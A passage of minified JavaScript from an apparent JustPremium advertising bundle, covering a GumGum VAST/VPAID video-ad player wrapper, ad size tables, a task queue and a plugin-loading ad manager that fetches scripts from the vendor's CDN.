          var e = u.get(this);
          if (-1 !== e.di.jDOM.getElement("jp-video-backup-element")) return this.returnBackupVideoElement();
          var t = e.imaVideoWithSrc;
          return t || !1;
        }, t.prototype.returnVideoElement = function () {
          var e = u.get(this),
            t = e.wrapperElm,
            r = e.containerElm,
            i = void 0;
          if (e.videoWithSource && (e.videoWithSource.src || e.videoWithSource.currentSrc)) {
            if ("VIDEO" !== e.videoWithSource.tagName) return;
            return e.videoWithSource;
          }
          if ((i = r.getElementsByTagName("source")).length > 0) for (var n = 0; n < i.length; n++) if (i[n] && i[n].currentSrc || i[n].src) {
            if (e.videoWithSource = i = i[n].parentNode, "VIDEO" !== e.videoWithSource.tagName) return;
            return e.videoWithSource;
          }
          if ((i = r.querySelector("video")) && (i.currentSrc || i.src)) {
            if (e.videoWithSource = i, "VIDEO" !== e.videoWithSource.tagName) return;
            return e.videoWithSource;
          }
          if ((i = t.querySelector("video")) && (i.currentSrc || i.src)) {
            if (e.videoWithSource = i, "VIDEO" !== e.videoWithSource.tagName) return;
            return e.videoWithSource;
          }
          return !1;
        }, t.prototype.returnVideoParentElm = function () {
          return u.get(this).isBackupVideo ? e.prototype.returnVideoParentElm.call(this) : this.returnAdContainerSecondChild();
        }, t.prototype.returnVideoWrapper = function () {
          var t = u.get(this);
          return t.isBackupVideo ? e.prototype.returnVideoWrapper.call(this) : t.wrapperElm;
        }, t.prototype.setParentClass = function (e) {
          var t = u.get(this),
            r = t.wrapperElm,
            i = "";
          null !== r.getAttribute("class") && (i = r.getAttribute("class")), t.videoElm.classList.add("jpx-hidden"), t.wrapperElm.setAttribute("class", i + " " + e);
        }, t.prototype.unmute = function () {
          var e = u.get(this);
          e.videoElm.muted = !1, e.videoElm.volume = 1;
          var t = e.adsManager.getVolume();
          0 === t || 1 === t ? (e.adsManager.setVolume(1), this._updateVolumeSlider(!1)) : e.adsManager.setVolume(t);
        }, t.prototype.setup = function (t, r) {
          u.get(this).isBackupVideo = !1, e.prototype._setPrefix.call(this), e.prototype._bindBlurEvent.call(this, r), e.prototype._bindFocusEvent.call(this), e.prototype._bindFullscreenEvent.call(this), e.prototype._bindMouseEvent.call(this), this._bindClickEvents(), this._bindIMAEvents();
        }, t;
      }(n.default);
    t.default = c;
  },
  571: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = o(r(23)),
      n = o(r(2));
    o(r(1));
    function o(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function a(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), i = 0; i < r.length; i++) {
          var n = r[i],
            o = Object.getOwnPropertyDescriptor(t, n);
          o && o.configurable && void 0 === e[n] && Object.defineProperty(e, n, o);
        }
      }(e, t));
    }
    var s = new WeakMap(),
      u = function (e) {
        function t(r) {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, t);
          var i = function (e, t) {
              if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
              return !t || "object" != typeof t && "function" != typeof t ? e : t;
            }(this, e.call(this, r)),
            n = i,
            o = e.prototype._setPrivates.call(i, r);
          return n._promises = [], s.set(n, o), o.di = r.di, o.adCurrentTime = 0, o.adDuration = 3, o.isPlaying = !0, o.isStarted = !1, o.isDestroyed = !1, o.isFirstQuartile = !1, o.isMidpoint = !1, o.isThirdQuartile = !1, o.isCompleted = !1, o.volumeChangeDelay = !0, i;
        }
        return a(t, e), t.prototype._bindGumGumEvents = function () {
          var e = this;
          e._promises.push(new Promise(function (t) {
            s.get(e).di.jDOM.subscribe("afterRender", function () {
              t();
            });
          })), e._promises.push(new Promise(function (t) {
            e.subscribe("adLoaded", function () {
              t();
            });
          })), e._promises.push(new Promise(function (t) {
            e.subscribe("playerLoaded", function () {
              t();
            });
          })), e._bindProductEvents(), e._bindGumGumVastVpaidEvents(), e.subscribe("adLoaded", function () {
            e._isVPAID(), e._setClickUrl(), e.createControlsStyleLink(), e._isVPAID() ? e._bindGumGumVpaidEvents() : e._bindGumGumVastEvents();
          });
        }, t.prototype._bindGumGumVastVpaidEvents = function () {
          var e = this,
            t = s.get(e);
          t.ggEzVpInstance.once("data-ready", function () {
            e.publish("adLoaded", [], 0);
          }), t.ggEzVpInstance.once("ready", function () {
            e.publish("playerLoaded", [], 0), e.publish("adImpression", [e, e._isVPAID() ? "VPAID" : "VAST"], 0), e.play();
          }), t.ggEzVpInstance.on("play", function () {
            t.isPlaying = !0;
          }), t.ggEzVpInstance.on("error", function (t) {
            e.publish("playerError", t, 0);
          });
        }, t.prototype._bindGumGumVastEvents = function () {
          var e = this,
            t = s.get(e);
          t.ggEzVpInstance.on("pause", function () {
            t.isPlaying = !1, e.publish("PAUSED", [], 0);
          }), t.ggEzVpInstance.on("play", function () {
            t.isStarted && e.publish("RESUMED", [], 0);
          }), t.ggEzVpInstance.once("play", function () {
            t.isStarted = !0, e.publish("LOADED", [], 0), e.publish("STARTED", [], 0);
          }), t.ggEzVpInstance.on("volumechange", function (t) {
            e._volumeChange(t.target.volume);
          }), t.ggEzVpInstance.on("playback-progress", function (r) {
            t.adCurrentTime = r.currentTime, 3 <= t.adDuration && (t.adDuration = r.duration);
            var i = e.getCurrentTime(),
              n = e.getDuration(),
              o = i / n * 100;
            if (o) {
              !t.isFirstQuartile && o >= 25 && o < 50 && (t.isFirstQuartile = !0, e.publish("FIRST_QUARTILE", [], 0)), !t.isMidpoint && o >= 50 && o < 75 && (t.isMidpoint = !0, e.publish("MIDPOINT", [], 0)), !t.isThirdQuartile && o > 75 && o < 100 && (t.isThirdQuartile = !0, e.publish("THIRD_QUARTILE", [], 0));
              var a = n - .75 * n,
                s = (a - (n - i)) / a > .75;
              !t.isCompleted && s && (t.isCompleted = !0, e.publish("COMPLETE", [], 0));
            }
          });
        }, t.prototype._bindGumGumVpaidEvents = function () {
          var e = this,
            t = s.get(e);
          t.ggEzVpInstance.on("player-click", function () {
            e.publish("CLICK", [], 0);
          }), t.ggEzVpInstance.once("AdStarted", function () {
            e.publish("LOADED", [], 0);
          }), t.ggEzVpInstance.once("AdVideoStart", function () {
            t.isStarted = !0, e.publish("STARTED", [], 0);
          }), t.ggEzVpInstance.on("AdPlaying", function () {
            t.isStarted && e.publish("RESUMED", [], 0);
          }), t.ggEzVpInstance.on("AdPaused", function () {
            t.isPlaying = !1, e.publish("PAUSED", [], 0);
          }), t.ggEzVpInstance.on("AdError", function (t) {
            e.publish("playerError", [t], 0);
          }), t.ggEzVpInstance.on("AdVolumeChange", function (t) {
            e._volumeChange(t);
          }), t.ggEzVpInstance.once("AdVideoFirstQuartile", function () {
            e.publish("FIRST_QUARTILE", [], 0);
          }), t.ggEzVpInstance.once("AdVideoMidpoint", function () {
            e.publish("MIDPOINT", [], 0);
          }), t.ggEzVpInstance.once("AdVideoThirdQuartile", function () {
            e.publish("THIRD_QUARTILE", [], 0);
          }), t.ggEzVpInstance.once("AdVideoComplete", function () {
            e.publish("COMPLETE", [], 0);
          });
        }, t.prototype._bindProductEvents = function () {
          var e = this;
          e.subscribe("userClick", function () {
            e._sendVideoTracking({
              type: "CLICK",
              emitted: "user"
            });
          });
        }, t.prototype._getConfigXMLURL = function (e) {
          var t = new Blob([e], {
            type: "text/xml"
          });
          return URL.createObjectURL(t);
        }, t.prototype._isVPAID = function () {
          return !!s.get(this).ggEzVpInstance.isVPAID;
        }, t.prototype._sendVideoTracking = function (e) {
          var t = s.get(this),
            r = t.di.jModel,
            i = t.di.jTracking;
          i && i.videoTracking([{
            player: {
              sdk: "GgEzVp",
              height: this.getVideoHeight(),
              width: this.getVideoWidth()
            },
            creative: {},
            action: {
              type: e.type,
              emitted: e.emitted ? e.emitted : "auto",
              playback: this.getCurrentTime()
            },
            site: {},
            trackerId: r.getData("trackerId") ? r.getData("trackerId") : ""
          }]);
        }, t.prototype._setClickUrl = function () {
          var e = s.get(this),
            t = e.di.jModel;
          e.ggEzVpInstance.VASTTracker && e.ggEzVpInstance.VASTTracker.clickThroughURLTemplate && e.ggEzVpInstance.VASTTracker.clickThroughURLTemplate.url && t.addProperty("clickURL", e.ggEzVpInstance.VASTTracker.clickThroughURLTemplate.url);
        }, t.prototype._subscribeEvents = function () {
          var e = this;
          s.get(e).di.jTracking && (e.subscribe("CLICK", function () {
            e._sendVideoTracking({
              type: "CLICK",
              emitted: "user"
            });
          }), e.subscribe("COMPLETE", function () {
            e._sendVideoTracking({
              type: "COMPLETE",
              emitted: "auto"
            });
          }), e.subscribe("FIRST_QUARTILE", function () {
            e._sendVideoTracking({
              type: "FIRST_QUARTILE",
              emitted: "auto"
            });
          }), e.subscribe("MIDPOINT", function () {
            e._sendVideoTracking({
              type: "MIDPOINT",
              emitted: "auto"
            });
          }), e.subscribe("THIRD_QUARTILE", function () {
            e._sendVideoTracking({
              type: "THIRD_QUARTILE",
              emitted: "auto"
            });
          }), e.subscribe("PAUSED", function () {
            e._sendVideoTracking({
              type: "PAUSED",
              emitted: "auto"
            });
          }), e.subscribe("LOADED", function () {
            e._sendVideoTracking({
              type: "LOADED",
              emitted: "auto"
            });
          }), e.subscribe("RESUMED", function () {
            e._sendVideoTracking({
              type: "RESUMED",
              emitted: "auto"
            });
          }), e.subscribe("STARTED", function () {
            e._sendVideoTracking({
              type: "STARTED",
              emitted: "auto"
            });
          }), e.subscribe("USER_CLOSE", function () {
            e._sendVideoTracking({
              type: "USER_CLOSE",
              emitted: "auto"
            });
          }), e.subscribe("VOLUME_CHANGED", function () {
            e._sendVideoTracking({
              type: "VOLUME_CHANGED",
              emitted: "user"
            });
          }), e.subscribe("VOLUME_MUTED", function () {
            e._sendVideoTracking({
              type: "VOLUME_MUTED",
              emitted: "user"
            });
          }));
        }, t.prototype._volumeChange = function (e) {
          var t = s.get(this);
          t.isStarted && e !== t.currentVolume && (t.currentVolume = e, t.volumeChangeDelay && (this.publish("VOLUME_CHANGED", [], 0), 0 === e && this.publish("VOLUME_MUTED", [], 0), t.volumeChangeDelay = !1, n.default.delay(this, function () {
            t.volumeChangeDelay || (t.volumeChangeDelay = !0);
          }, 500)));
        }, t.prototype.createPlayerInstance = function () {
          var e = this,
            t = s.get(e),
            r = t.di,
            i = r.jAdFrame,
            n = r.jModel.getData("creative.vastRaw");
          t.ggEzVpInstance = new GgEzVp({
            container: i.getJDOMElement("player").getDOMElement(),
            src: e._getConfigXMLURL(n),
            autoplay: !0,
            controls: {
              expand: !1,
              progress: !0,
              skip: !0,
              play: !0,
              timestamp: !0,
              volume: !0
            },
            isVAST: !0,
            loop: !0
          }), e.publish("onRequestAds", [e], 0), e._subscribeEvents(), e._bindGumGumEvents();
        }, t.prototype.createControlsStyleLink = function () {
          s.get(this).di.jDOM.createElement("gg-ez-vp.css", {
            tag: "link",
            parent: "@head",
            attributes: {
              rel: "stylesheet",
              type: "text/css",
              media: "all",
              href: "https://c.gumgum.com/vp/latest/gg-ez-vp.css"
            }
          });
        }, t.prototype.destroy = function () {
          e.prototype.destroy.call(this), this.destroyPlayer();
        }, t.prototype.destroyPlayer = function () {
          var e = s.get(this);
          e.isDestroyed || (e.isDestroyed = !0, e.ggEzVpInstance.destroy(), e.ggEzVpInstance = null);
        }, t.prototype.executionFailure = function () {
          this.publish("executionFailure", [], 0);
        }, t.prototype.getContainer = function () {
          var e = s.get(this);
          return {
            clientWidth: e.wrapperElm.clientWidth,
            clientHeight: e.wrapperElm.clientHeight,
            setStyle: function (t, r) {
              e.wrapperElm.style[t] = r;
            }
          };
        }, t.prototype.getCurrentTime = function () {
          return s.get(this).adCurrentTime;
        }, t.prototype.getCurrentTimeInPercent = function () {
          return s.get(this).adCurrentTime / this.getDuration() * 100;
        }, t.prototype.getDuration = function () {
          return s.get(this).adDuration;
        }, t.prototype.getVideoHeight = function () {
          return this.returnGumGumVideo() ? this.returnGumGumVideo().videoHeight : 0;
        }, t.prototype.getVideoWidth = function () {
          return this.returnGumGumVideo() ? this.returnGumGumVideo().videoWidth : 0;
        }, t.prototype.isPlaying = function () {
          return s.get(this).isPlaying;
        }, t.prototype.mute = function () {
          var e = s.get(this);
          e.isDestroyed || e.ggEzVpInstance.mute();
        }, t.prototype.pause = function () {
          var e = s.get(this);
          e.isDestroyed || (e.ggEzVpInstance.pause(), this.publish("pause", [], 0));
        }, t.prototype.play = function () {
          var e = s.get(this);
          e.isDestroyed || (e.ggEzVpInstance.play(), this.publish("play", [], 0));
        }, t.prototype.ready = function () {
          return Promise.all(this._promises).then(function (e) {
            return e;
          });
        }, t.prototype.returnVideoContainerElm = function () {
          return this.returnGumGumVideo();
        }, t.prototype.returnGumGumVideoParent = function () {
          var e = s.get(this);
          return !e.isDestroyed && e.ggEzVpInstance.player.parentElement;
        }, t.prototype.returnGumGumVideo = function () {
          var e = s.get(this);
          return !e.isDestroyed && e.ggEzVpInstance.player;
        }, t.prototype.returnVideoContainer = function () {
          return this.returnGumGumVideo();
        }, t.prototype.returnVideoElement = function () {
          return this.returnGumGumVideoParent();
        }, t.prototype.returnVideoWrapper = function () {
          return this.returnGumGumVideoParent();
        }, t.prototype.unmute = function () {
          s.get(this).ggEzVpInstance.unmute();
        }, t.prototype.setup = function (t, r) {
          e.prototype._setPrefix.call(this), e.prototype._bindBlurEvent.call(this, r), e.prototype._bindFocusEvent.call(this);
        }, t;
      }(i.default);
    t.default = u;
  },
  73: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = {
      limits: {
        default: {
          width: 90,
          height: 70
        },
        ms: {
          width: 90,
          height: 50
        }
      },
      sizes: {
        as: [[728, 90], [970, 90]],
        cf: [[120, 90]],
        fa: [[728, 90], [970, 90]],
        fi: [[1920, 1080], [1920, 540]],
        fv: [[704, 396]],
        hi: [[1280, 455], [1024, 768]],
        is: [[300, 250], [300, 600], [320, 480], [336, 280], [320, 320], [320, 180], [320, 240], [160, 600], [120, 600]],
        ms: [[320, 50], [320, 100], [640, 100]],
        mt: [[300, 600], [320, 320], [320, 480]],
        mv: [[240, 135], [320, 50], [320, 100], [640, 100]],
        pa: [[300, 250], [320, 320], [336, 280]],
        pu: [[970, 250], [800, 280], [970, 500], [980, 120], [980, 150], [980, 240], [980, 300], [930, 180], [970, 90], [800, 250], [640, 100], [930, 600]],
        sa: [[300, 600], [300, 250], [120, 600], [160, 600]],
        wp: [[1800, 1e3], [1920, 1200]],
        wv: [[1800, 1e3], [1920, 1200]]
      },
      getSizeByRTBHouseHash: function (e, t) {
        var r = {
          jyWNyNAh9XirI8sDYcQA: [720, 480],
          IfdLGouR5B8tlOLoi07E: [970, 500],
          ObrGJTECSBmbX0scEvxi: [300, 250],
          ca02FeYEPUVjfUHTAdOK: [300, 600],
          "0IEcLt35uowAB56zJBh5": [728, 90],
          "01PMDjWIedPS1TmVKJGn": [970, 250]
        };
        return r[e] ? r[e] : this.sizes[t][0];
      },
      getSizes: function (e) {
        return this.sizes[e];
      },
      fitSizes: function (e, t, r) {
        return !!this.sizes[e].find(function (e) {
          return e[0] === parseInt(r) && e[1] === parseInt(t);
        });
      },
      getProductMin: function (e, t) {
        return this.limits[e] ? this.limits[e][t] : this.limits.default[t];
      },
      getPrimarySize: function (e) {
        return this.sizes[e][0];
      }
    };
    t.default = i;
  },
  91: function (e, t, r) {
    "use strict";

    function i(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), i = 0; i < r.length; i++) {
          var n = r[i],
            o = Object.getOwnPropertyDescriptor(t, n);
          o && o.configurable && void 0 === e[n] && Object.defineProperty(e, n, o);
        }
      }(e, t));
    }
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = function (e) {
      function t() {
        return function (e, t) {
          if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
        }(this, t), function (e, t) {
          if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
          return !t || "object" != typeof t && "function" != typeof t ? e : t;
        }(this, e.call(this));
      }
      return i(t, e), t;
    }(function (e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }(r(4)).default);
    t.default = n;
  }
});
this.Jpx = this.Jpx || {}, this.Jpx.JAM = webpackJsonpJpx__name_([19], {
  557: function (e, t, n) {
    "use strict";

    e.exports = n(558).default;
  },
  558: function (e, t, n) {
    "use strict";

    (function (e) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var r = l(n(4)),
        o = l(n(16)),
        i = l(n(1)),
        u = l(n(559)),
        a = l(n(33)),
        s = l(n(85)),
        c = l(n(560));
      l(n(91)), l(n(2)), l(n(561));
      function l(e) {
        return e && e.__esModule ? e : {
          default: e
        };
      }
      function p(e, t) {
        if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
        e.prototype = Object.create(t && t.prototype, {
          constructor: {
            value: e,
            enumerable: !1,
            writable: !0,
            configurable: !0
          }
        }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
          for (var n = Object.getOwnPropertyNames(t), r = 0; r < n.length; r++) {
            var o = n[r],
              i = Object.getOwnPropertyDescriptor(t, o);
            i && i.configurable && void 0 === e[o] && Object.defineProperty(e, o, i);
          }
        }(e, t));
      }
      var f = {},
        d = new WeakMap(),
        h = void 0,
        y = i.default.getTopScope(),
        g = function (e) {
          return e.charAt(0).toUpperCase() + e.slice(1);
        },
        v = function (t) {
          function n(e) {
            !function (e, t) {
              if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
            }(this, n);
            var r = function (e, t) {
                if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
                return !t || "object" != typeof t && "function" != typeof t ? e : t;
              }(this, t.call(this)),
              o = r;
            o._config = {}, o._timers = {}, o._matchingPixel = {}, o.initialized = !0;
            var i = {
              conflict: {
                zones: {},
                formats: {},
                ads: {}
              },
              plugins: Array.isArray(e.plugins) ? e.plugins.map(function (e) {
                return {
                  type: e,
                  init: !1
                };
              }) : [],
              di: e.di
            };
            d.set(o, i);
            var u = y.jPAM;
            return o.cmd = o.cmd || u && u.cmd || [], o.cb = o.cb || u && u.cb || {}, o._shba = o._shba || u && u._shba || [], r;
          }
          return p(n, t), n.prototype._initializePlugins = function (e) {
            var t = this,
              n = d.get(t);
            return e && e.length && e.forEach(function (e) {
              n.di.jTaskManager.push(t, t._addPlugin, [e.type]);
            }), t;
          }, n.prototype._hasPlugin = function (e) {
            var t = d.get(this),
              n = "Plugin" + g(e),
              r = (window.Jpx || y.Jpx)[n];
            return !(!r || !t.plugins.find(function (e) {
              return e instanceof r;
            }));
          }, n.prototype._loadScript = function (e) {
            var t = this;
            return e ? (Array.isArray(e) || (e = [e]), Promise.all(e.map(function (e) {
              return t._requestResource(e).catch(function (e) {
                throw o.default.error("JAdManager: Server returned empty response"), e;
              });
            }))) : o.default.error("JAdManager: Error attempting to request empty URL");
          }, n.prototype._requestSources = function (e) {
            var t = this;
            return e ? ("[object Array]" !== Object.prototype.toString.call(e) && (e = [e]), Promise.all(e.map(function (e) {
              return t._requestSource(e).catch(function (e) {
                return o.default.error("JAdManager: Server returned empty response"), e;
              });
            }))) : o.default.error("JAdManager: Error attempting to request empty URL");
          }, n.prototype._processCmd = function () {
            var e = this,
              t = d.get(e).di.jTaskManager,
              n = function (t) {
                for (var n = [], r = void 0; r = e.cmd.shift();) "function" == typeof r && n.push(r());
                return e.publish("flushCmd", [e]), t(n);
              };
            return t.getCount() ? t.ready(function () {
              t.push(e, n, []);
            }) : t.push(e, n, []), e;
          }, n.prototype._requestResource = function (e) {
            var t = void 0;
            if (f[e]) {
              var n = f[e];
              if (n.isResolved) return Promise.resolve();
              if (!n.isRejected) return n;
            }
            (t = document.createElement("script")).type = "text/javascript", t.async = !0;
            var r = new Promise(function (n, o) {
              t.readyState ? t.onreadystatechange = function () {
                "loaded" !== t.readyState && "complete" !== t.readyState || (t.onreadystatechange = null, r.isResolved = !0, n({
                  url: e,
                  success: !0
                }));
              } : t.onload = function () {
                r.isResolved = !0, n({
                  url: e,
                  success: !0
                });
              }, t.onerror = function (t) {
                r.isRejected = !0, o({
                  url: e,
                  success: !1,
                  event: t
                });
              };
            });
            t.src = e.search(/\?/) > -1 ? e + "&v=v2.44.492" : e + "?v=v2.44.492";
            var o = document.getElementsByTagName("head");
            return (o = o.length ? o : document.getElementsByTagName("body")).length && (o = o[0]).insertBefore(t, o.firstChild), f[e] = r, r;
          }, n.prototype._requestSource = function (e) {
            var t = new window.XMLHttpRequest(),
              n = new Promise(function (r, o) {
                t.readyState ? t.onreadystatechange = function () {
                  "loaded" !== t.readyState && "complete" !== t.readyState || (t.onreadystatechange = null, n.isResolved = !0, t({
                    url: e,
                    success: !0
                  }));
                } : t.onload = function () {
                  n.isResolved = !0, new Function(t.responseText)(), r({
                    url: e,
                    success: !0
                  });
                }, t.onerror = function (t) {
                  n.isRejected = !0, o({
                    url: e,
                    success: !1,
                    event: t
                  });
                };
              });
            return t.open("GET", e, !0), t.withCredentials = !0, t.send(null), n;
          }, n.prototype.addPlugin = function (e) {
            return this._addPlugin(e);
          }, n.prototype._addPlugin = function (e, t) {
            var n = this,
              r = d.get(n),
              i = d.get(n).plugins,
              u = "Plugin" + g(e),
              a = function () {
                var t = i.map(function (e) {
                  return e.type;
                }).indexOf(e);
                i.splice(t, 1);
              };
            if (n.hasPlugin(e)) return t && t(r.plugins[e]);
            var Jpx = window.Jpx || y.Jpx || {};
            return Jpx[u] ? (a(), r.plugins[e] = new Jpx[u]({
              di: {
                jAdManager: n
              }
            }), i.push(r.plugins[e]), t && t(r.plugins[e])) : n._loadScript(["//cdn.justpremium.com/js/v2.44.492/jpx." + u + ".js"]).then(function () {
              o.default.info("JAdManager: plugin " + e + " loaded"), a();
              var s = new Jpx[u]({
                di: {
                  jAdManager: n
                }
              });
              return i.push(s), t && t(r.plugins[e]);
            });
          }, n.prototype.getPlugin = function (e) {
            var t = d.get(this),
              n = "Plugin" + g(e),
              Jpx = window.Jpx || y.Jpx,
              r = Jpx[n] ? t.plugins.find(function (e) {
                return e instanceof Jpx[n];
              }) : void 0;
            if (!r) throw this.error(903, {
              plugin: e
            });
            return r;
          }, n.prototype.loadFormat = function (e) {
            return (window.Jpx || y.Jpx)[e.charAt(0).toUpperCase() + e.substr(1)] ? Promise.resolve() : this._loadScript(["//cdn.justpremium.com/js/v2.44.492/jpx." + g(e) + ".js"]);
          }, n.prototype.hasPlugin = function (e) {
            return this._hasPlugin(e);
          }, n.prototype.init = function () {
            var e = d.get(this).plugins;
            return this._initializePlugins(e), this._processCmd(), this;
          }, n.prototype.isReady = function () {
            return 0 === d.get(this).di.jTaskManager.getCount();
          }, n.prototype.removeAdFromTrackingList = function (e) {
            var t = d.get(this),
              Jpx = window.Jpx || y.Jpx,
              n = Jpx.PluginBidder ? t.plugins.find(function (e) {
                return e instanceof Jpx.PluginBidder;
              }) : void 0,
              r = Jpx.PluginAdserver ? t.plugins.find(function (e) {
                return e instanceof Jpx.PluginAdserver;
              }) : void 0;
            n ? this.getPlugin("bidder").removeAdFromList(e) : r && this.getPlugin("adserver").removeAdFromList(e);
          }, n.prototype.getAdFormats = function () {
            return this.getPlugin("bidder").getAds().map(function (e) {
              return e.format;
            });
          }, n.prototype.setResourceCache = function (e) {
            for (var t in e) e.hasOwnProperty(t) && (f[t] = e[t]);
            return this;
          }, n.prototype.processCmd = function () {
            try {
              this._processCmd();
            } catch (r) {
              r.message, r.stack;
              var t = !1;
              try {
                t = this.getPlugin("bidder");
              } catch (e) {}
              var n = s.default.factory("bidder", t ? "berr" : "er", e);
              n.zoneId = {}.zone || 0, n.errorCode = 223, n.stack = r.stack, a.default.instance().trackRaw(n);
            }
            return this;
          }, n.prototype.setGlobals = function (e, t) {
            return i.default.setDevice(e), c.default.execute({
              init: t
            }), this;
          }, n.prototype.ready = function () {
            var e = d.get(this).di.jTaskManager;
            return {
              then: function (t) {
                e.ready(t);
              }
            };
          }, n.factory = function (e) {
            return new n(e);
          }, n.instance = function (e) {
            return h || ((e = e || {}).di = e.di || {}, e.di.jTaskManager = u.default.factory(), o.default.debug(!0), o.default.info("JAdManager: version v2.44.492 initialized"), o.default.debug(!1), (h = y.jPAM = n.factory(e)).init(), h);
          }, n;
        }(r.default);
      t.default = v;
    }).call(t, n(170));
  },
  559: function (e, t, n) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var r = function (e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }(n(4));
    function o(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var n = Object.getOwnPropertyNames(t), r = 0; r < n.length; r++) {
          var o = n[r],
            i = Object.getOwnPropertyDescriptor(t, o);
          i && i.configurable && void 0 === e[o] && Object.defineProperty(e, o, i);
        }
      }(e, t));
    }
    var i = new WeakMap(),
      u = function (e) {
        function t() {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, t);
          var n = function (e, t) {
            if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
            return !t || "object" != typeof t && "function" != typeof t ? e : t;
          }(this, e.call(this));
          return i.set(n, {
            queue: []
          }), n;
        }
        return o(t, e), t.prototype.push = function (e, t, n) {
          var r = this,
            o = i.get(r).queue,
            u = function i() {
              n.push(function () {
                var e = o.indexOf(i);
                o.splice(e, 1), r.publish("taskRemoved", [r, o.length]);
              }), t.apply(e, n);
            };
          return o.push(u), u(), r;
        }, t.prototype.ready = function (e) {
          if (this.getCount()) var t = this.subscribe("taskRemoved", function (n) {
            0 === n[1] && (t(), e && e());
          });else e && e();
          return this;
        }, t.prototype.getCount = function () {
          return i.get(this).queue.length;
        }, t.factory = function () {
          return new t();
        }, t;
      }(r.default);
    t.default = u;
  },
  560: function (e, t, n) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var r = i(n(20)),
      o = i(n(1));
    function i(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function u(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var n = Object.getOwnPropertyNames(t), r = 0; r < n.length; r++) {
          var o = n[r],
            i = Object.getOwnPropertyDescriptor(t, o);
          i && i.configurable && void 0 === e[o] && Object.defineProperty(e, o, i);
        }
      }(e, t));
    }
    var a = new WeakMap(),
      s = (o.default.getTopScope(), function (e) {
        function t(n) {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, t);
          var r = function (e, t) {
              if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
              return !t || "object" != typeof t && "function" != typeof t ? e : t;
            }(this, e.call(this, n)),
            o = r;
          n = n || {};
          var i = {};
          return i.di = n.di || {}, i.conflict = n.conflict || {}, i.conflict.ads = i.conflict.ads || {}, i.conflict.formats = i.conflict.formats || {}, a.set(o, i), r;
        }
        return u(t, e), t.prototype._extendFnBody = function (e) {
          return function () {
            var e = void 0;
            try {
              (e = window.top).location.href;
            } catch (t) {
              e = window;
            }
            var Jpx = e.Jpx || {},
              t = e.Jpa || {};
            Jpx.bidder = {
              isConflict: this.isConflict
            }, Jpx.global = Jpx.global || {}, Jpx.apply = Jpx.apply || function () {}, Jpx.define = Jpx.define || function () {}, Jpx.bootstrap = Jpx.bootstrap || function () {}, t.define = t.define || function () {}, Jpx.modules = Jpx.modules || {}, Jpx.modules.platform = Jpx.modules.platform || {}, Jpx.modules.product = Jpx.modules.product || {}, Jpx.modules.platform.getOpenXScript = Jpx.modules.platform.getOpenXScript || function () {}, Jpx.helpers = Jpx.helpers || {}, Jpx.helpers.style = Jpx.helpers.style || {}, Jpx.helpers.style.addSheet = function (t) {
              var n = e.document,
                r = n.createElement("style");
              return r.innerHTML = "/* JPX custom stylesheet */ " + t, r.className = "jpx-stylesheet-inserted", n.body.appendChild(r), r;
            }, Jpx.helpers.style.getValue = function (t, n) {
              return t ? e.getComputedStyle && e.getComputedStyle(t, null) ? e.getComputedStyle(t, null).getPropertyValue(n) : t.style[n] : "";
            }, Jpx.helpers.style.getScale = function (e) {
              var t = Jpx._h.style.getValue(e, "transform").match(/matrix\((-?\d*\.?\d+),\s*0,\s*0,\s*(-?\d*\.?\d+),\s*0,\s*0\)/),
                n = {
                  width: 1,
                  height: 1
                };
              return t && t[1] ? {
                width: parseFloat(t[1]),
                height: parseFloat(t[2])
              } : n;
            }, e.Jpx = Jpx, e.Jpa = t;
          }.toString().replace(/function\s*\(\)\s*\{?/i, "").slice(0, -1) + ";" + e;
        }, t.prototype._extendScope = function (t) {
          var n = a.get(this);
          t.isConflict = function (e) {
            var t = n.conflict.formats;
            switch (e) {
              case "wv":
              case "wp":
